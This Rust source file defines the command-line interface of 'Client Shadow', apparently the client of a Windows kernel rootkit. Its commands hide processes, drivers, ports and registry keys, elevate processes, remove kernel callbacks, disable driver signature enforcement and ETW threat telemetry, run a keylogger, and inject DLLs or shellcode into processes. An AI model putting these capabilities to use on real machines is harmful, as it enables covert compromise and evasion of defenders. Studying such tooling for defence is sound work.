#![allow(non_camel_case_types)]

use clap::{arg, ArgAction, Parser, Subcommand, ValueHint};
use crate::utils::{
    validate_sys_extension, 
    Callbacks, 
    Options, 
    PortType, 
    Protocol, 
    BANNER
};

/// The main command-line interface struct.
#[derive(Parser)]
#[clap(author="joaoviictorti", about="Client Shadow", long_about = BANNER)]
pub struct Cli {
    /// The command to be executed.
    #[command(subcommand)]
    pub command: Commands,

    /// Activate verbose mode (-v, -vv for additional levels)
    #[arg(short, long, action = ArgAction::Count)]
    pub verbose: u8,
}

/// Enum representing the available top-level commands.
#[derive(Subcommand)]
pub enum Commands {
    /// Operations related to processes.
    Process {
        /// Subcommands for process operations.
        #[command(subcommand)]
        sub_command: ProcessCommands,
    },

    /// Operations related to threads.
    Thread {
        /// Subcommands for thread operations.
        #[command(subcommand)]
        sub_command: ThreadCommands,
    },

    /// Operations related to drivers.
    Driver {
        /// Subcommands for Driver operations.
        #[command(subcommand)]
        sub_command: Option<DriverCommands>,

        /// Hide the driver.
        #[arg(long)]
        hide: bool,

        /// Unhide the driver
        #[arg(long)]
        unhide: bool,

        /// Enumerate the drivers.
        #[arg(long, short)]
        list: bool,

        /// Name Driver
        #[arg(long, value_hint = ValueHint::FilePath, value_parser = validate_sys_extension)]
        name: Option<String>,
    },

    /// Operations related to Misc.
    Misc {
        /// Subcommands for Misc operations.
        #[command(subcommand)]
        sub_command: MisCommands,
    },

    /// Operations related to Network.
    Network {
        /// Hide the port.
        #[arg(long)]
        hide: bool,

        /// Unhide the port.
        #[arg(long)]
        unhide: bool,

        /// Protocol (TCP, UDP).
        #[arg(long, required = true)]
        protocol: Protocol,

        /// Type Port
        #[arg(long, required = true)]
        r#type: PortType,

        /// Number port.
        #[arg(short, required = true)]
        port_number: u16,
    },

    /// Operations related to Registry.
    #[cfg(not(feature = "mapper"))]
    Registry {
        #[command(subcommand)]
        sub_command: RegistryCommands,
    },

    /// Operations related to Module.
    Module {
        #[command(subcommand)]
        sub_command: ModuleCommands,
    },

    /// Operations related to Callback.
    Callback {
        /// Enumerate callback.
        #[arg(long, short)]
        list: bool,

        /// Enumerate Removed callback.
        #[arg(long, short)]
        enumerate: bool,

        /// Remove callback.
        #[arg(long)]
        remove: Option<usize>,

        /// Select callback.
        #[arg(long, short, required = true)]
        callback: Callbacks,

        /// Restore callback.
        #[arg(long)]
        restore: Option<usize>,
    },
    /// Operations related to Injection
    Injection {
        /// Subcommands for thread operations.
        #[command(subcommand)]
        sub_command: InjectionCommands,
    },
}

/// Enum representing the subcommands for process operations.
#[derive(Subcommand)]
pub enum DriverCommands {
    Block {
        /// Name Driver
        #[arg(long, value_hint = ValueHint::FilePath, value_parser = validate_sys_extension)]
        name: Option<String>,

        /// Add block.
        #[arg(short, long)]
        add: bool,

        /// Remove block.
        #[arg(short, long)]
        remove: bool,
    }
}

#[derive(Subcommand)]
pub enum RegistryCommands {
    /// Enable protection for the registry
    Protect {
        /// name of the key to be protected
        #[arg(short, long, required = true)]
        key: String,

        /// name of the value key to be protected
        #[arg(short, long)]
        name: Option<String>,

        /// Add protection.
        #[arg(short, long)]
        add: bool,

        /// Remove protection.
        #[arg(short, long)]
        remove: bool,
    },
    /// Hide the registry
    Hide {
        /// name of the key to be hide
        #[arg(short, long, required = true)]
        key: String,

        /// name of the value to be hide
        #[arg(short, long)]
        value: Option<String>,
    },

    /// Unhide the registry
    Unhide {
        /// name of the key to be unhide
        #[arg(short, long, required = true)]
        key: String,

        /// name of the value to be unhide
        #[arg(short, long)]
        value: Option<String>,
    },
}

#[derive(Subcommand)]
pub enum InjectionCommands {
    /// DLL Injection
    DLL {
        /// The process ID to injection.
        #[arg(long, short, required = true)]
        pid: u32,

        /// Path containing the dll
        #[arg(long, required = true)]
        path: String,

        /// Type shellcode
        #[arg(long, short, required = true)]
        r#type: InjectionTypes,
    },

    /// Shellcode Injection
    Shellcode {
        /// The process ID to injection.
        #[arg(long, short, required = true)]
        pid: u32,

        /// Path containing the shellcode
        #[arg(long, required = true)]
        path: String,

        /// Type shellcode
        #[arg(long, short, required = true)]
        r#type: InjectionTypes,
    },
}

/// Enum representing the subcommands for process operations.
#[derive(Subcommand)]
pub enum ProcessCommands {
    /// Elevate the process.
    Elevate {
        /// The process ID to elevate.
        #[arg(short, long, required = true)]
        pid: u32,
    },

    /// Hide the process.
    Hide {
        /// The process ID to hide.
        #[arg(short, long, required = true)]
        pid: u32,
    },

    /// Unhide the process.
    Unhide {
        /// The process ID to unhide.
        #[arg(short, long, required = true)]
        pid: u32,
    },

    /// Terminate the process.
    Terminate {
        /// The process ID to terminate.
        #[arg(short, long, required = true)]
        pid: u32,
    },

    /// Signature the process.
    Signature {
        /// The process ID to protect.
        #[arg(short, long, required = true)]
        pid: u32,

        /// The protection type.
        #[arg(long, required = true)]
        pt: PS_PROTECTED_TYPE,

        /// The protection signer.
        #[arg(long, required = true)]
        sg: PS_PROTECTED_SIGNER,
    },

    /// Enable protection for the process.
    #[cfg(not(feature = "mapper"))]
    Protection {
        /// The process ID for protection.
        #[arg(short, long, required = true)]
        pid: u32,

        /// Add protection.
        #[arg(short, long)]
        add: bool,

        /// Remove protection.
        #[arg(short, long)]
        remove: bool,
    },
    /// Lists protected or hidden processes
    Enumerate {
        /// Enumerate Processes.
        #[arg(long, short, required = true)]
        list: bool,

        // Types Enumerate
        #[arg(long, short, required = true)]
        r#type: Options,
    },
}

#[derive(Subcommand)]
pub enum MisCommands {
    /// Operations related to DSE (Driver Signature Enforcement).
    DSE {
        /// Disable DSE.
        #[arg(long)]
        disable: bool,

        /// Enable DSE.
        #[arg(long)]
        enable: bool,
    },

    /// Operations related to Keylogger.
    Keylogger {
        /// File path for storing keylogger output
        #[arg(long, required = true)]
        file: String,
    },

    /// Operations related to ETWTI.
    Etwti {
        /// Disable ETWTI.
        #[arg(long)]
        disable: bool,

        /// Enable ETWTI.
        #[arg(long)]
        enable: bool,
    },
}

/// Enum representing the subcommands for module operations.
#[derive(Subcommand)]
pub enum ModuleCommands {
    /// Hide the module.
    Hide {
        /// The module to hide.
        #[arg(short, long, required = true)]
        name: String,

        /// The pid to module.
        #[arg(short, long, required = true)]
        pid: u32,
    },

    /// Enumerate modules.
    Enumerate {
        /// The process ID for enumerate modules.
        #[arg(short, long, required = true)]
        pid: u32,
    },
}

/// Enum representing the subcommands for thread operations.
#[derive(Subcommand)]
pub enum ThreadCommands {
    /// Hide the thread.
    Hide {
        /// The thread ID to hide.
        #[arg(short, long, required = true)]
        tid: u32,
    },
    
    /// Unhide the thread.
    Unhide {
        /// The thread ID to unhide.
        #[arg(short, long, required = true)]
        tid: u32,
    },

    /// Enable protection for the thread.
    #[cfg(not(feature = "mapper"))]
    Protection {
        /// The thread ID for protection.
        #[arg(short, long, required = true)]
        tid: u32,

        /// Add protection.
        #[arg(short, long)]
        add: bool,

        /// Remove protection.
        #[arg(short, long)]
        remove: bool,
    },

    /// Lists protected or hidden processes
    Enumerate {
        /// Enumerate Processes.
        #[arg(long, required = true)]
        list: bool,

        // Types Enumerate
        #[arg(long, short, required = true)]
        r#type: Options,
    },
}

/// Enum representing the types of process protection.
#[derive(clap::ValueEnum, Clone, Debug, Copy)]
pub enum PS_PROTECTED_TYPE {
    /// No protection.
    None = 0,

    /// Light protection.
    ProtectedLight = 1,

    /// Full protection.
    Protected = 2,
}

#[derive(clap::ValueEnum, Clone, Debug, Copy)]
pub enum InjectionTypes {
    /// Injection using Thread
    Thread = 0,

    /// Injection using APC
    APC = 1,

    /// Thread Hijacking
    ThreadHijacking = 2,
}

/// Enum representing the signers for process protection.
#[derive(clap::ValueEnum, Clone, Debug, Copy)]
pub enum PS_PROTECTED_SIGNER {
    /// No signer.
    None = 0,

    /// Authenticode signer.
    Authenticode = 1,

    /// Code generation signer.
    CodeGen = 2,

    /// Antimalware signer.
    Antimalware = 3,

    /// LSA signer.
    Lsa = 4,

    /// Windows signer.
    Windows = 5,

    /// WinTcb signer.
    WinTcb = 6,

    /// WinSystem signer.
    WinSystem = 7,

    /// Application signer.
    App = 8,

    /// Maximum value for signers.
    Max = 9,
}
